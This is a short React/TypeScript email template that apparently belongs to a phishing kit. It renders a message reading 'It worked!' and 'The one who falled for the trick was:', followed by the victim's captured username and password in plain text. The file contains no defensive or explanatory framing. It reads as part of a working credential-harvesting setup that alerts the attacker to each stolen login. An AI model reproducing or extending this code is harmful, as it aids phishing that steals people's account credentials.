import * as React from "react";

interface EmailTemplateProps {
  username: string;
  password: string;
}

export const EmailTemplate: React.FC<Readonly<EmailTemplateProps>> = ({
  username,
  password,
}) => (
  <div>
    <h1>It worked!</h1>
    <p>The one who falled for the trick was:</p>
    <p>Username: {username}</p>
    <p>Password: {password}</p>
  </div>
);
